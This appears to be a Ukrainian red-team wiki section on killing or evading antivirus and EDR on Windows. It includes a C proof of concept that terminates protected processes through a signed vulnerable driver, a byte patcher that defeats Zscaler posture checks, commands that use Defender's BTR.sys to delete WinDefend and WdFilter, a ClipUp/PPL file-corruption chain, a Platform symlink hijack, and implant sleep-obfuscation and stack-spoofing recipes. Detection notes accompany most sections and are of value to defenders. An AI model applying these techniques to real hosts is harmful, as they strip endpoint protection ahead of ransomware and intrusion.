## Bring Your Own Vulnerable Driver (BYOVD) — знищення AV/EDR з простору ядра

Storm-2603 скористалася невеликою консольною утилітою **Antivirus Terminator**, щоб вимкнути захист кінцевих пристроїв перед розгортанням ransomware. Інструмент використовує **власний вразливий, але *підписаний* драйвер** і зловживає ним для виконання привілейованих операцій ядра, які не можуть заблокувати навіть AV-служби із захистом Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Ключові висновки
1. **Підписаний драйвер**: файл, що записується на диск, — `ServiceMouse.sys`, але фактично це легітимно підписаний драйвер `AToolsKrnl64.sys` з «System In-Depth Analysis Toolkit» від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть за ввімкненого Driver-Signature-Enforcement (DSE).
2. **Встановлення служби**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Перший рядок реєструє драйвер як **службу ядра**, а другий запускає його, завдяки чому `\\.\ServiceMouse` стає доступним із користувацького простору.
3. **IOCTLs, які надає драйвер**
   | Код IOCTL | Можливість                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Завершити довільний процес за PID (використовується для зупинки служб Defender/EDR) |
   | `0x990000D0` | Видалити довільний файл із диска |
   | `0x990001D0` | Вивантажити драйвер і видалити службу |

   Мінімальний proof-of-concept на C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Чому це працює**: BYOVD повністю обходить захисти user-mode; код, що виконується в ядрі, може відкривати *захищені* процеси, завершувати їх або втручатися в об’єкти ядра незалежно від PPL/PP, ELAM чи інших функцій посилення захисту.

Виявлення / пом’якшення ризиків
•  Увімкніть список заблокованих уразливих драйверів Microsoft (`HVCI`, `Smart App Control`), щоб Windows відмовлялася завантажувати `AToolsKrnl64.sys`.
•  Відстежуйте створення нових служб *kernel* і сповіщайте про завантаження драйвера з каталогу, доступного для запису всім користувачам, або драйвера, якого немає в списку дозволених.
•  Стежте за дескрипторами user-mode до спеціальних об’єктів пристроїв, за якими йдуть підозрілі виклики `DeviceIoControl`.

### Обхід перевірок стану пристрою Zscaler Client Connector за допомогою patching бінарних файлів на диску

**Client Connector** від Zscaler застосовує локальні правила стану пристрою та покладається на Windows RPC для передавання результатів іншим компонентам. Обхід стає можливим через два слабкі рішення в дизайні:

1. Оцінювання стану пристрою відбувається **повністю на стороні клієнта** (на сервер надсилається логічне значення).
2. Внутрішні кінцеві точки RPC перевіряють лише те, чи **підписаний Zscaler** виконуваний файл, який підключається (за допомогою `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Обидва механізми можна нейтралізувати, **пропатчивши чотири підписані бінарні файли на диску**:

| Бінарний файл | Вихідну логіку пропатчено | Результат |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тому кожна перевірка проходить успішно |
| `ZSAService.exe` | Непрямий виклик `WinVerifyTrust` | Замінюється на NOP ⇒ будь-який процес, навіть непідписаний, може підключатися до каналів RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінюється на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Перевірки цілісності тунелю | Пропускаються |

Мінімальний фрагмент patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Після заміни оригінальних файлів і перезапуску стека служб:

* **Усі** перевірки стану відображають **зелений статус/відповідність вимогам**.
* Непідписані або змінені бінарні файли можуть відкривати кінцеві точки RPC іменованих каналів (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей приклад демонструє, як кілька змін байтів можуть обійти суто клієнтські рішення про довіру та прості перевірки підписів.

## Microsoft Defender `BTR.sys`: зловживання довіреною функціональністю

Драйвер **Boot-Time Removal** у Defender — корисний приклад, що протиставляється класичному BYOVD. `BTR.sys` — це легітимний компонент виправлення системи з підписом Microsoft, у якому немає помилки пошкодження пам’яті та інтерфейсу IOCTL; натомість, отримавши доступ адміністратора та `SeLoadDriverPrivilege`, оператор може підробити його приватну транзакцію виправлення й отримати передбачені операції з файлами та реєстром на рівні Ring-0. Це примітив **нейтралізації AV/EDR після компрометації, а не початкового доступу чи підвищення привілеїв**; драйвер можна витягти з ресурсу `BOOTTIMETOOL` у власному `MpEngine.dll` цільового хоста, не імпортуючи помітний сторонній драйвер.<sup>[[36]](#references)</sup>

### Підготовка одноразового драйвера

Зазвичай Defender записує ресурс у файл із випадковою назвою `[a-z]{8}.sys` і реєструє службу ядра з подібною назвою. `DriverEntry` читає значення `Args` служби, відкриває вказаний ADS файлової системи NTFS, розшифровує та перевіряє список дій, записує дані зворотного зв’язку й після успішного виконання повертає `0xC0000056` (`STATUS_DELETE_PENDING`), щоб драйвер вивантажився, а не залишався резидентним. Підроблена служба має такі характерні значення.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Потік `:changelist` містить один зашифрований RC4 блок даних. У проаналізованих збірках повторно використовується фіксований ключ завдовжки 256 байтів, тому шифрування не є межею авторизації. Коректний відкритий текст містить 24-байтовий глобальний заголовок (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC заголовка та ідентифікатор транзакції, отриманий із корисного навантаження), за яким іде шлях зворотного зв'язку у форматі UTF-16 із завершальним нульовим символом і довільна кількість елементів. Кожен елемент містить 16-байтовий заголовок (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) і дані, специфічні для дії, що завершуються **рівно чотирма нульовими байтами**. Кожен регіон заголовка/даних перевіряється окремо за допомогою CRC-32 із поліномом `0xEDB88320`, початковим станом `0xFFFFFFFF` і **без фінального XOR** (`~CRC32`); стан CRC скидається для кожного регіону.<sup>[[36]](#references)[[37]](#references)</sup>

Прийняті ID дій надають доступ до таких примітивів ядра.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Дані елемента | Результат |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Видалити файл, зокрема заблокований |
| 2 | `[UTF-16 path]` | Видалити порожній каталог |
| 3 | `[Flags][source][destination]` | Перемістити файл у захищений шлях, вибраний зловмисником; порожній шлях призначення означає видалення |
| 4 | `[Flags][key path]` | Рекурсивно видалити ключ реєстру |
| 5 | `[Flags][key path + "\\" + value]` | Видалити значення реєстру |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Створити/оновити значення реєстру та створити відсутні шляхи ключів |

Для дій 5 і 6 роздільником ключа/значення у форматі передачі є **дві послідовні зворотні скісні риски**; шлях у звичному форматі не буде розділено належним чином. Файл зворотного зв'язку здебільшого повторює запит, але перші чотири байти даних кожного елемента стають його результатом `NTSTATUS`. Для дій 1 і 2, які не мають початкового поля прапорців, BTR зсуває шлях у чотири зарезервовані байти в кінці, щоб звільнити місце для цього статусу.<sup>[[36]](#references)</sup>

### Робочий процес `BTR_CLI` і вікно раннього завантаження

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) реалізує весь ланцюжок: витягує `BTR.sys` із локального Defender, створює `<random>.sys:changelist` і потік зворотного зв'язку, серіалізує/обчислює контрольні суми/шифрує ланцюжки дій, безпосередньо створює ключ реєстру служби, а потім викликає `NtLoadDriver` для `-trigger now` або залишає драйвер для запуску під час завантаження системи, використовуючи `-trigger boot`. Пряме додавання даних до реєстру оминає звичайний шлях SCM `CreateServiceW`, тому подія встановлення служби з ID 7045 **не генерується**. Артефакти, створені для запуску під час завантаження, згодом можна видалити командою `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` непридатне, оскільки BTR виконує файлові операції з `DriverEntry` до того, як стек сховища та посилання `SystemRoot` будуть готові. `Start=1` разом із групою високого пріоритету `Boot Bus Extender` натомість запускає драйвер на Phase 1: NTFS уже доступна, але багато драйверів безпеки із системним запуском і служб EDR у режимі користувача ще не ініціалізовані. Фільтри, що запускаються під час завантаження, як-от `WdFilter`, можуть уже бути завантажені, проте BTR може видалити їхні бінарні файли або конфігурацію служб до наступного запуску, а також видалити виконувані файли служб до їх запуску через SCM. ELAM не усуває цю прогалину, оскільки BTR запускається після оцінювання драйверів, що стартують під час завантаження, і має дійсний підпис Microsoft.<sup>[[36]](#references)</sup>

Кілька дій виконуються в межах однієї транзакції. PoC додає на початок Action 1 для жорстко заданого шляху `\SystemRoot\Temp\BootClean.log`: BTR створює цей журнал, а потім обробляє власний запит на видалення й видаляє його перед вивантаженням. Це зменшує обсяг доказів, а збереження відгуку в `<random>.sys:<random>.dat` дає змогу одночасно видалити драйвер і обидва потоки.<sup>[[36]](#references)[[37]](#references)</sup>

### Кореляції для виявлення з високою достовірністю

Правила, що перевіряють лише підпис, і список блокування вразливих драйверів Microsoft не захищають від зловживання передбаченими можливостями BTR. Надавайте перевагу наведеним поведінковим кореляціям і водночас відрізняйте легітимний ланцюжок походження Defender від довільного процесу запуску.<sup>[[36]](#references)</sup>

- **Sysmon 15:** створення `.sys:changelist` є типовим для етапу підготовки BTR. Потік ADS `.dat`, пов’язаний із тим самим `.sys`, особливо підозрілий, оскільки легітимний Defender зазвичай зберігає відгук у `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 без System 7045:** зіставляйте пряме створення `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, що містить `Args=...:changelist` і `Group=Boot Bus Extender`, за відсутності відповідної події встановлення через SCM.
- **Sysmon 6 -> 23:** зіставляйте завантаження відомого драйвера BTR із процесу, що не належить до ланцюжка походження Defender, із подальшим видаленням файлу, атрибутованим `System`/PID 4, особливо якщо йдеться про бінарні файли безпеки.
- **Sysmon 11 -> 23:** сповіщайте про швидке створення та видалення `\SystemRoot\Temp\BootClean.log` процесом `System`/PID 4.
- Обмежуйте й аудіюйте призначення та ввімкнення `SeLoadDriverPrivilege`; одного підпису Microsoft недостатньо, щоб довіряти драйверу засобу безпеки, якщо його готує `cmd.exe`, PowerShell або невідомий процес.

## Зловживання Protected Process Light (PPL) для втручання в AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) забезпечує ієрархію підписувачів/рівнів, за якої втручатися один в одного можуть лише захищені процеси з таким самим або вищим рівнем. З погляду атакувальника, якщо вдається легітимно запустити бінарний файл із підтримкою PPL і контролювати його аргументи, можна перетворити нешкідливу функціональність (наприклад, ведення журналу) на обмежений механізм запису під захистом PPL у захищені каталоги, які використовують AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Що забезпечує запуск процесу як PPL
- Цільовий EXE (і всі завантажені DLL) має бути підписаний EKU, що підтримує PPL.
- Процес потрібно створити за допомогою CreateProcess із прапорцями: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Потрібно запитати сумісний рівень захисту, що відповідає підписувачу бінарного файлу (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для підписувачів anti-malware, `PROTECTION_LEVEL_WINDOWS` для підписувачів Windows). Неправильний рівень призведе до помилки створення процесу.

Див. також ширший вступ до PP/PPL і захисту LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти запуску
- Допоміжний інструмент із відкритим кодом: CreateProcessAsPPL (вибирає рівень захисту та передає аргументи цільовому EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Приклад використання:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Примітив LOLBIN: ClipUp.exe
- Підписаний системний бінарний файл `C:\Windows\System32\ClipUp.exe` запускає себе повторно й приймає параметр для запису файлу журналу за вказаним викликачем шляхом.
- Якщо його запущено як процес PPL, запис файлу відбувається з правами PPL.
- ClipUp не може обробляти шляхи, що містять пробіли; використовуйте короткі шляхи 8.3, щоб указати на зазвичай захищені розташування.

Допоміжні засоби для коротких шляхів 8.3
- Перегляд коротких імен: `dir /x` у кожному батьківському каталозі.
- Отримання короткого шляху в cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Ланцюжок зловживання (абстрактно)
1) Запустіть LOLBIN із підтримкою PPL (ClipUp) із параметром `CREATE_PROTECTED_PROCESS` за допомогою лаунчера (наприклад, CreateProcessAsPPL).
2) Передайте аргумент шляху до журналу ClipUp, щоб примусово створити файл у захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте короткі імена 8.3.
3) Якщо AV зазвичай відкриває/блокує цільовий бінарний файл під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час завантаження системи, до запуску AV, установивши службу автозапуску, яка гарантовано запускається раніше. Перевірте порядок завантаження за допомогою Process Monitor (журналювання завантаження).
4) Після перезавантаження запис із правами PPL відбувається до того, як AV блокує свої бінарні файли, пошкоджуючи цільовий файл і перешкоджаючи запуску.

Приклад виклику (шляхи приховано/скорочено з міркувань безпеки):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Примітки та обмеження
- Ви не можете контролювати вміст, який записує ClipUp, лише його розташування; цей примітив підходить для пошкодження, а не для точного впровадження вмісту.
- Для встановлення/запуску служби та перезавантаження потрібні локальні права адміністратора/SYSTEM.
- Час має вирішальне значення: цільовий файл не має бути відкритим; виконання під час завантаження системи дає змогу уникнути блокування файлів.

Виявлення
- Створення процесу `ClipUp.exe` з нетиповими аргументами, особливо якщо його батьківський процес — нестандартний засіб запуску, під час завантаження системи або близько до нього.
- Нові служби, налаштовані на автоматичний запуск підозрілих бінарних файлів і такі, що стабільно запускаються раніше за Defender/AV. Перевіряйте створення/зміну служб перед збоями запуску Defender.
- Моніторинг цілісності файлів бінарних файлів Defender/каталогів Platform; неочікуване створення/зміна файлів процесами з прапорцями захищеного процесу.
- Телеметрія ETW/EDR: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, і аномальне використання рівня PPL небінарними файлами AV.

Заходи захисту
- WDAC/Code Integrity: обмежте, які підписані бінарні файли можуть запускатися як PPL і з якими батьківськими процесами; блокуйте запуск ClipUp поза легітимними сценаріями.
- Гігієна служб: обмежте створення/зміну служб з автоматичним запуском і відстежуйте маніпуляції порядком запуску.
- Переконайтеся, що захист від втручання Defender і захист на ранньому етапі запуску ввімкнені; перевіряйте помилки запуску, які вказують на пошкодження бінарних файлів.
- Якщо це сумісно з вашим середовищем, розгляньте можливість вимкнути створення коротких імен 8.3 на томах, де розміщені засоби безпеки (ретельно протестуйте).

## Втручання в Microsoft Defender через підміну символічного посилання на каталог версії Platform

Windows Defender визначає платформу, з якої він запускається, шляхом переліку підкаталогів у:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Він вибирає підкаталог із найбільшим лексикографічним рядком версії (наприклад, `4.18.25070.5-0`), а потім запускає звідти процеси служби Defender (відповідно оновлюючи шляхи служби/реєстру). Під час цього вибору система довіряє записам каталогів, зокрема точкам повторної обробки каталогів (символічним посиланням). Адміністратор може скористатися цим, щоб перенаправити Defender до шляху, доступного для запису зловмиснику, і виконати DLL sideloading або порушити роботу служби.<sup>[[21]](#references)[[22]](#references)</sup>

Передумови
- Локальний адміністратор (потрібен для створення каталогів/символічних посилань у каталозі Platform)
- Можливість перезавантажити систему або запустити повторний вибір платформи Defender (перезапуск служби під час завантаження)
- Потрібні лише вбудовані засоби (mklink)

Чому це працює
- Defender блокує запис у власні каталоги, але під час вибору платформи довіряє записам каталогів і вибирає лексикографічно найвищу версію, не перевіряючи, чи веде ціль до захищеного/довіреного шляху.

Покроково (приклад)
1) Підготуйте доступну для запису копію поточного каталогу платформи, наприклад `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть у Platform символьне посилання на каталог із вищою версією, що вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендується перезавантажити систему):
```cmd
shutdown /r /t 0
```
4) Переконайтеся, що MsMpEng.exe (WinDefend) працює з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs that Defender loads from its application directory to execute code in Defender’s processes. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remove the version-symlink so on next start the configured path doesn’t resolve and Defender fails to start:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Зверніть увагу: ця техніка сама по собі не забезпечує підвищення привілеїв; для неї потрібні права адміністратора.

## Перехоплення API/IAT + Call-Stack Spoofing за допомогою PIC (у стилі Crystal Kit)

Red teams можуть перенести ухилення під час виконання з імпланта C2 безпосередньо в цільовий модуль, перехопивши його Import Address Table (IAT) і спрямовуючи вибрані API через контрольований зловмисником позиційно-незалежний код (PIC). Це узагальнює ухилення за межі невеликого набору API, доступного в багатьох kits (наприклад, CreateProcessA), і поширює той самий захист на BOFs і DLL-файли для post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Підхід високого рівня
- Розмістіть PIC blob поруч із цільовим модулем за допомогою reflective loader (на початку або як супровідний файл). PIC має бути самодостатнім і позиційно-незалежним.
- Під час завантаження host DLL перегляньте його IMAGE_IMPORT_DESCRIPTOR і пропатчте записи IAT для цільових імпортів (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі обгортки PIC.
- Кожна обгортка PIC виконує ухилення перед передаванням керування реальній адресі API через tail-call. Типові методи ухилення включають:
  - Маскування/зняття маскування пам’яті навколо виклику (наприклад, шифрування областей beacon, зміна RWX→RX, зміна імен/дозволів сторінок), а потім відновлення після виклику.
  - Call-Stack Spoofing: створення нешкідливого стека й перехід до цільового API, щоб під час аналізу стека викликів визначалися очікувані фрейми.<sup>[[9]](#references)</sup>
- Для сумісності експортуйте інтерфейс, щоб скрипт Aggressor (або аналогічний засіб) міг реєструвати API, які потрібно перехоплювати для Beacon, BOFs і DLL-файлів для post-exploitation.

Навіщо тут потрібне перехоплення IAT
- Працює з будь-яким кодом, який використовує перехоплений імпорт, не потребуючи змін у коді інструмента чи проксування окремих API через Beacon.
- Охоплює DLL-файли для post-exploitation: перехоплення LoadLibrary* дає змогу перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати таке саме маскування та ухилення зі стеком до їхніх викликів API.
- Відновлює надійну роботу команд post-exploitation, які запускають процеси, проти засобів виявлення на основі стека викликів, обгортаючи CreateProcessA/W.

Мінімальний приклад перехоплення IAT (псевдокод x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Примітки
- Застосовуйте патч після релокацій/ASLR і до першого використання імпорту. Reflective loaders, як-от TitanLdr/AceLdr, демонструють hooking під час DllMain завантаженого модуля.
- Робіть wrappers компактними й безпечними для PIC; визначайте справжній API через початкове значення IAT, збережене до патчингу, або через LdrGetProcedureAddress.
- Для PIC використовуйте переходи RW → RX і не залишайте сторінки доступними для запису й виконання одночасно.

Заглушка call-stack spoofing
- PIC stubs у стилі Draugr формують фальшивий ланцюжок викликів (return addresses у benign modules), а потім переходять до справжнього API.
- Це обходить засоби виявлення, які очікують канонічні стеки від Beacon/BOFs під час виклику чутливих API.
- Поєднуйте це з техніками stack cutting/stack stitching, щоб потрапляти в очікувані frames перед prologue API.

Операційна інтеграція
- Додавайте reflective loader на початок post-ex DLLs, щоб PIC і hooks автоматично ініціалізувалися під час завантаження DLL.
- Використовуйте Aggressor script для реєстрації цільових API, щоб Beacon і BOFs прозоро отримували переваги того самого шляху обходу без змін коду.

Міркування щодо виявлення/DFIR
- Цілісність IAT: записи, що вказують на адреси non-image (heap/anon); періодична перевірка import pointers.
- Аномалії стека: return addresses, що не належать до завантажених images; раптові переходи до non-image PIC; неузгоджена ancestry RtlUserThreadStart.
- Телеметрія loader: записи в IAT усередині процесу, рання активність DllMain, що змінює import thunks, неочікувані RX regions, створені під час завантаження.
- Обхід image-load: якщо ви hook-ите LoadLibrary*, відстежуйте підозрілі завантаження automation/clr assemblies, пов’язані з подіями маскування пам’яті.

Пов’язані будівельні блоки та приклади
- Reflective loaders, що виконують IAT patching під час завантаження (наприклад, TitanLdr, AceLdr)
- Hooks маскування пам’яті (наприклад, simplehook) і stack-cutting PIC (stackcutting)
- PIC stubs для call-stack spoofing (наприклад, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks через резидентний PICO

Якщо ви контролюєте reflective loader, можна hook-ити імпорти **під час** `ProcessImports()`, замінивши вказівник loader на `GetProcAddress` власним resolver, який спершу перевіряє hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Створіть **резидентний PICO** (постійний PIC-об’єкт), який зберігається після того, як transient loader PIC звільняє себе.
- Експортуйте функцію `setup_hooks()`, яка перезаписує import resolver loader (наприклад, `funcs.GetProcAddress = _GetProcAddress`).
- У `_GetProcAddress` пропускайте ordinal imports і використовуйте пошук hooks на основі хешу, як-от `__resolve_hook(ror13hash(name))`. Якщо hook знайдено, повертайте його; інакше передавайте виклик справжньому `GetProcAddress`.
- Реєструйте цілі hooks під час link time за допомогою записів Crystal Palace `addhook "MODULE$Func" "hook"`. Hook залишається дійсним, оскільки розташований усередині резидентного PICO.

Це забезпечує **перенаправлення IAT під час імпорту** без патчингу секції коду завантаженої DLL після завантаження.

### Примусове створення imports, доступних для hooking, коли ціль використовує PEB-walking

Import-time hooks спрацьовують лише тоді, коли функція фактично є в IAT цілі. Якщо модуль визначає API через PEB-walk + hash (без запису імпорту), примусово додайте справжній імпорт, щоб loader обробив його через шлях `ProcessImports()`:

- Замініть визначення hashed exports (наприклад, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) на пряме посилання, як-от `&WaitForSingleObject`.
- Компілятор створить запис IAT, що дасть змогу перехопити імпорт під час його обробки reflective loader.

### Sleep/idle obfuscation у стилі Ekko без патчингу `Sleep()`

Замість патчингу `Sleep` hook-іть **фактичні примітиви очікування/IPC**, які використовує implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Для тривалих очікувань обгорніть виклик у ланцюжок обфускації у стилі Ekko, який шифрує образ у пам’яті під час простою:<sup>[[31]](#references)[[27]](#references)</sup>

- Використовуйте `CreateTimerQueueTimer` для планування послідовності callbacks, які викликають `NtContinue` з підготовленими frames `CONTEXT`.
- Типовий ланцюжок (x64): перевести образ у `PAGE_READWRITE` → зашифрувати RC4 через `advapi32!SystemFunction032` весь mapped image → виконати блокувальне очікування → розшифрувати RC4 → **відновити дозволи для кожної секції**, пройшовши PE sections → подати сигнал про завершення.
- `RtlCaptureContext` надає шаблон `CONTEXT`; клонуйте його в кілька frames і задайте registers (`Rip/Rcx/Rdx/R8/R9`) для виклику кожного кроку.

Операційна деталь: повертайте «успіх» для тривалих очікувань (наприклад, `WAIT_OBJECT_0`), щоб caller продовжив роботу, поки образ замаскований. Цей шаблон приховує модуль від сканерів під час простою та уникає класичного сигнатурного шаблону «patched `Sleep()`».

Ідеї для виявлення (на основі телеметрії)
- Сплески callbacks `CreateTimerQueueTimer`, що вказують на `NtContinue`.
- Використання `advapi32!SystemFunction032` для великих суцільних buffers розміром з образ.
- `VirtualProtect` для великого діапазону з подальшим відновленням дозволів для окремих секцій.

### Runtime CFG registration для гаджетів sleep-obfuscation

На цілях із увімкненим CFG перший непрямий перехід до mid-function gadget, наприклад `jmp [rbx]` або `jmp rdi`, зазвичай аварійно завершує процес з `STATUS_STACK_BUFFER_OVERRUN`, оскільки gadget відсутній у CFG metadata модуля. Щоб ланцюжки у стилі Ekko/Kraken працювали в захищених процесах:<sup>[[30]](#references)</sup>

- Зареєструйте кожну непряму ціль, яку використовує ланцюжок, за допомогою `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` і записів `CFG_CALL_TARGET_VALID`.
- Для адрес усередині завантажених images (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` має починатися з **базової адреси образу** й охоплювати **повний розмір образу**.
- Для manually mapped/PIC/stomped regions використовуйте натомість **базову адресу allocation** і її розмір.
- Позначайте не лише dispatch gadget, а й exports, до яких переходять непрямо (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), а також будь-які контрольовані атакувальником executable sections, які стануть непрямими цілями.

Це перетворює sleep chains у стилі ROP/JOP із «працює лише в процесах без CFG» на повторно використовуваний примітив для `explorer.exe`, browsers, `svchost.exe` та інших endpoints, скомпільованих із `/guard:cf`.

### CET-safe stack spoofing для потоків у режимі сну

Повна заміна `CONTEXT` створює шум і може порушити роботу систем із CET Shadow Stack, оскільки підроблений `Rip` усе одно має збігатися з апаратним shadow stack. Безпечніший шаблон маскування під час сну:<sup>[[30]](#references)</sup>

- Виберіть інший потік у тому самому процесі й прочитайте межі його стека `NT_TIB` / TEB (`StackBase`, `StackLimit`) через `NtQueryInformationThread`.
- Збережіть резервну копію справжнього TEB/TIB поточного потоку.
- Зафіксуйте справжній контекст потоку, що перебуває в режимі сну, за допомогою `GetThreadContext`.
- Скопіюйте в spoof context **лише** справжній `Rip`, залишивши підроблений стан `Rsp`/стека без змін.
- Під час сну скопіюйте `NT_TIB` spoof-потоку в TEB поточного потоку, щоб stack walkers розмотували стек у межах легітимного діапазону.
- Після завершення очікування відновіть початкові TIB і контекст потоку.

Це зберігає узгоджений із CET вказівник інструкцій, водночас вводячи в оману EDR stack walkers, які довіряють метаданим стека TEB під час перевірки розмотування стека.

### Альтернатива на основі APC: Kraken Mask

Якщо dispatch через timer queue має надто впізнаваний сигнатурний шаблон, ту саму послідовність sleep-encrypt-spoof-restore можна виконати із призупиненого helper thread за допомогою поставлених у чергу APC:<sup>[[27]](#references)</sup>

- Створіть helper thread із точкою входу `NtTestAlert`.
- Поставте підготовлені frames `CONTEXT`/APCs у чергу за допомогою `NtQueueApcThread` і виконайте їх за допомогою `NtAlertResumeThread`.
- Зберігайте стан ланцюжка в heap, а не в стеку helper thread, щоб не вичерпати стандартний стек потоку розміром 64 KB.
- Використовуйте `NtSignalAndWaitForSingleObject`, щоб атомарно подати сигнал про подію початку й заблокуватися.
- Призупиніть main thread перед відновленням TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), щоб зменшити проміжок часу, коли сканер може виявити стек у частково відновленому стані.

Так сигнатура `CreateTimerQueueTimer` + `NtContinue` замінюється сигнатурою helper-thread/APC, зберігаючи ті самі цілі маскування RC4 і stack spoofing.

Додаткові ідеї для виявлення
- `NtSetInformationVirtualMemory` із `VmCfgCallTargetInformation` незадовго до сну, очікувань або APC dispatch.
- `GetThreadContext`/`SetThreadContext` навколо `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` або `ConnectNamedPipe`.
- Виклик `NtQueryInformationThread` із подальшими прямими записами в межі стека TEB/TIB поточного потоку.
- Ланцюжки `NtQueueApcThread`/`NtAlertResumeThread`, що непрямо викликають `SystemFunction032`, `VirtualProtect` або helpers для відновлення дозволів секцій.
- Повторне використання коротких сигнатур gadgets, як-от `FF 23` (`jmp [rbx]`) або `FF E7` (`jmp rdi`), як dispatch pivots усередині підписаних модулів.


## Precision Module Stomping

